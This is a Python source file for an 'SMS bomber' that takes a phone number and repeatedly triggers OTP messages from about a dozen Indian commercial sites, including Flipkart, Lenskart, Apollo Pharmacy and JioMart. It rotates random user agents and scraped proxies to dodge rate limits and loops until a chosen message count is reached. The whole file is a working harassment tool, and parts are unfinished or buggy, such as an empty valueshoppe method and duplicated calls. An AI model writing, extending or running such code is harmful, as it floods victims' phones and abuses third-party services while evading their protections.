import json
import random
import requests


class Bomber:

	def __init__(self, user_mobile, number_of_messege):
		self.user_mobile = user_mobile
		self.number_of_messege = number_of_messege
		self.acceptlanguage = "en-GB,en-US;q=0.9,en;q=0.8"

	def getUserAgent(self):
		with open('useragent.json') as f:
			data = json.load(f)
			user_agent_list =  data["user_agent"]
		userAgent = random.choice(user_agent_list)
		return userAgent


	def _checkinternet(self):
		try:
			requests.get("https://www.google.com")
			return True
		except:
			print("Check your internet connection and the modules")
			return False

	def getproxy(self):
		proxy_scrape_url = "https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all"
		try:
			proxy_request = requests.get(proxy_scrape_url, Timeout =  10)
		except:
			return False
		proxylist =  proxy_request.text.split()
		return 'https://' + random.choice(proxylist)
	
	def flipkart(self):
		url = "https://rome.api.flipkart.com/api/7/user/otp/generate"
		flipkart_header = {
		"Accept": "*/*",
		"Accept-Encoding": "gzip, deflate, br",
		"Accept-Language": self.acceptlanguage,
		"Connection": "keep-alive",
		"Content-Length": "53",
		"Content-Type": "application/json",
		"DNT": "1",	
		"Host": "rome.api.flipkart.com",
		"Origin": "https://www.flipkart.com",
		"Referer": "https://www.flipkart.com/",
		"Sec-Fetch-Dest": "empty",
		"Sec-Fetch-Mode": "cors",
		"Sec-Fetch-Site": "same-site",
		"User-Agent": self.getUserAgent(),
		"X-user-agent": self.getUserAgent() + " FKUA/website/42/website/Desktop"
		}
		try:
			request =  requests.post(url, data  = json.dumps( {"loginId":"+91" + self.user_mobile}) , headers = flipkart_header,proxies={ 'https' : self.getproxy()})
		except:
			return False
		if(request.status_code ==  200 ):
			return True



	def confirmtkt(self):
		url = "https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber=" + self.user_mobile + "&newOtp=true"
		confirmtkt_header = {
		"Accept": "*/*",
		"Accept-Encoding": "gzip, deflate, br",
		"Accept-Language": self.acceptlanguage,
		"Connection": "keep-alive",
		"DNT": "1",
		"Host": "securedapi.confirmtkt.com",
		"Origin": "https://www.confirmtkt.com",
		"Referer": "https://www.confirmtkt.com/rbooking-d/trips",
		"Sec-Fetch-Dest": "empty",
		"Sec-Fetch-Mode": "cors",
		"Sec-Fetch-Site": "same-site",
		"User-Agent": self.getUserAgent()
		}
		try:
			request = requests.get(url ,headers=confirmtkt_header,proxies={ 'https' : self.getproxy()})
		except:
			return False
		if(request.status_code==200):
			return True


	def lenskart(self):
		url = "https://api.lenskart.com/v2/customers/sendOtp"
		lenskat_header = {
			"accept": "application/json, text/plain, */*",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": self.acceptlanguage,
			"content-length": "26",
			"content-type": "application/json;charset=UTF-8",
			"dnt": "1",
			"origin": "https://www.lenskart.com",
			"referer": "https://www.lenskart.com/",
			"sec-fetch-dest": "empty",
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-site",
			"user-agent": self.getUserAgent(),
			"x-api-client": "desktop",
			"x-b3-traceid": "991589389250988",
			"x-session-token": "85d09926-3a73-4dbe-9f30-86b9f29f4a67"
			}
		try:
			request = requests.post(url, data=json.dumps({"telephone":self.user_mobile}),headers = lenskat_header,proxies={ 'https' : self.getproxy()})
		except:
			return False
		if(request.status_code==200):
			return True

	def justdial(self):
		url = "https://www.justdial.com/functions/whatsappverification.php"
		justdial_header = {
			"accept": "*/*",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": self.acceptlanguage,
			"content-length": "38",
			"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
			"origin": "https://www.justdial.com",
			"referer": "https://www.justdial.com/",
			"sec-fetch-dest": "empty",
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin",
			"user-agent": self.getUserAgent(),
			"x-requested-with": "XMLHttpRequest",
		}
		try:
			r = requests.post(url, data="mob="+ self.user_mobile +"&vcode=&rsend=0&name=deV", headers=justdial_header,proxies={ 'https' : self.getproxy()})
		except:
			return False
		if(r.status_code==200):
			return True

	def indialends(self):
		url = "https://indialends.com/internal/a/otp.ashx"
		indialends_header = {
			"accept": "*/*",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": self.acceptlanguage,
			"Connection": "keep-alive",
			"content-length": "26",
			"content-type": "application/x-www-form-urlencoded",
			"dnt": "1",
			"Host": "indialends.com",
			"origin": "https://www.indialends.com",
			"referer": "https://www.indialends.com/",
			"sec-fetch-dest": "empty",
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin",
			"user-agent": self.getUserAgent(),
			"x-requested-with": "XMLHttpRequest",
		}
		try:
			r = requests.post(url, data="log_mode=1&ctrl="+self.user_mobile, headers=indialends_header,proxies={ 'https' : self.getproxy()})
		except:
			return False
		if(r.status_code==200):
			return True

	def apolopharmacy(self):
		url = "https://www.apollopharmacy.in/sociallogin/mobile/sendotp"
		apolopharmacy_header = {
			"accept": "*/*",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": self.acceptlanguage,
			"Connection": "keep-alive",
			"content-length": "17",
			"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
			"dnt": "1",
			"origin": "https://www.apollopharmacy.in",
			"referer": "https://www.apollopharmacy.in/",
			"sec-fetch-dest": "empty",
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin",
			"user-agent": self.getUserAgent(),
			"x-requested-with": "XMLHttpRequest",
		}
		try:
			request = requests.post(url, data="mobile=" + self.user_mobile, headers=apolopharmacy_header,proxies={ 'https' : self.getproxy()})
		except:
			return False
		if (request.status_code == 200):
			return True

	def magicbrick(self):
		url = "https://accounts.magicbricks.com/userauth/api/validate-mobile"
		magicbrike_header = {
			"accept": "application/json, text/javascript, */*; q=0.01",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": self.acceptlanguage,
			"content-length": "20",
			"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
			"dnt": "1",
			"origin": "https://accounts.magicbricks.com",
			"referer": "https://accounts.magicbricks.com/userauth/login",
			"sec-fetch-dest": "empty",
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin",
			"user-agent": self.getUserAgent(),
			"x-requested-with": "XMLHttpRequest"
		}
		try:
			request = requests.post(url, data="ubimobile="+ self.user_mobile, headers=magicbrike_header,proxies={ 'https' : self.getproxy()})
		except:
			return False
		if(request.status_code==200):
			return True

	def ajio(self):
		url = "https://login.web.ajio.com/api/auth/generateLoginOTP"
		ajio_header = {
			"accept": "application/json     ",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": self.acceptlanguage,
			"Connection": "keep-alive",
			"content-length": "29",
			"content-type": "application/json",
			"Host": "login.web.ajio.com",
			"dnt": "1",
			"origin": "https://www.ajio.com",
			"referer": "https://www.ajio.com/",
			"sec-fetch-dest": "empty",
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-site",
			"user-agent": self.getUserAgent()
		}
		try:
			request = requests.post(url, data=json.dumps({"mobileNumber": self.user_mobile}), headers=ajio_header,proxies={ 'https' : self.getproxy()})
		except:
			return False
		if (request.json()['success']):
			return True
		return False


	def mylescars(self):
		url = "https://www.mylescars.com/usermanagements/chkContact"
		myle_header = {
			"accept": "application/json",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": self.acceptlanguage,
			"content-length": "20",
			"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
			"dnt": "1",
			"origin": "https://www.mylescars.com",
			"referer": "https://www.mylescars.com/",
			"sec-fetch-dest": "empty",
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin",
			"user-agent": self.getUserAgent(),
			"x-requested-with": "XMLHttpRequest"
		}
		try:
			request = requests.post(url, data="contactNo="+ self.user_mobile, headers=myle_header,proxies={ 'https' : self.getproxy()})
		except:
			return False
		if(request.status_code==200):
			return True

	def unacademy(self):
		url = "https://unacademy.com/api/v1/user/get_app_link/"
		unac_header = {
			"accept": "application/json",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": self.acceptlanguage,
			"Connection": "keep-alive",
			"content-length": "107",
			"content-type": "application/json",
			"dnt": "1",
			"origin": "https://unacademy.com",
			"referer": "https://unacademy.com",
			"sec-fetch-dest": "empty",
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin",
			"user-agent": self.getUserAgent()
		}
		try:
			request = requests.post(url, data=json.dumps({"phone": self.user_mobile}), headers=unac_header,proxies={ 'https' : self.getproxy()})
		except:
			return False
		if(request.status_code==200):
			return True

	def snapdeal(self):
		url = "https://www.snapdeal.com/sendOTP"
		snapdeal_head = {
			"accept": "*/*",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
			"content-length": "62",
			"content-type": "application/x-www-form-urlencoded",
			"DNT": "1",
			"Host": "www.snapdeal.com",
			"origin": "https://www.snapdeal.com",
			"referer": "https://www.snapdeal.com/iframeLogin",
			"sec-fetch-dest": "empty",
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin",
			"user-agent": self.getUserAgent(),
			"X-Requested-With": "XMLHttpRequest"
		}
		try:
			request = requests.post(url, data="emailId=&mobileNumber="+ self.user_mobile + "&purpose=LOGIN_WITH_MOBILE_OTP",headers=snapdeal_head,proxies={ 'https' : self.getproxy()})
		except:
			return False
		if (request.json()['status'] == "fail"):
			return False
		return True

	def jiomart(self):
		url = "https://www.jiomart.com/mst/rest/v1/id/details/" + self.user_mobile
		jiomart_header = {
			"accept": "application/json, text/plain,*/*",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
			"dnt": "1",
			"sec-fetch-dest": "empty",
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin",
			"user-agent": self.getUserAgent(),
			"referer": "https://www.jiomart.com/customer/account/login"
		}
		try:
			request = requests.get(url, headers = jiomart_header,proxies={ 'https' : self.getproxy()})
		except:
			return False
		if(request.status_code==400):
			return True
	
	def valueshoppe(self):
		url= "https://www.valueshoppe.co.in/index.php?route=account/signup/sendSms"
		valueshoppe_header = {
		"Accept": "application/json, text/javascript, */*; q=0.01",
		"Accept-Encoding": "gzip, deflate, br",
		"Accept-Language": "en-US,en;q=0.9",
		"Connection": "keep-alive",
		"Content-Length": "94",
		"Content-Type": "application/x-www-form-urlencoded",
		"Host": "www.valueshoppe.co.in",
		"Origin": "https://www.valueshoppe.co.in",
		"Referer": "https://www.valueshoppe.co.in/seller-login",
		"Sec-Fetch-Dest": "empty",
		"Sec-Fetch-Mode": "cors",
		"User-Agent": self.getUserAgent(),
		"Sec-Fetch-Site": "same-origin",
		"X-Requested-With": "XMLHttpRequest"
		}


	def startBombing(self):
		if(self._checkinternet()):
			counter = 0
			while True:
				if self.flipkart():
					counter+=1
				if self.confirmtkt():
					counter+=1
				if self.lenskart():
					counter+=1
				if self.justdial():
					counter+=1
				if self.indialends():
					counter+=1
				if self.apolopharmacy():
					counter+=1
				if self.magicbrick():
					counter+=1
				if self.apolopharmacy():
					counter+=1
				if self.magicbrick():
					counter+=1
				if self.mylescars():
					counter+=1
				if self.unacademy():
					counter+=1
				if self.snapdeal():
					counter +=1
				if self.jiomart():
					counter +=1
				if(counter >= self.number_of_messege):
					break

			#["flipkart","confirmtkt","lenskart","justdial","indialends","apolopharmacy","magicbrick","ajio","mylescars","unacademy","snapdeal", "jiomart"]:
		else:
			print("possible errors -  Internet connectivity")



#shiprocketsocial,valueshoppe,housing.com,hoststar,byju,altbalaji,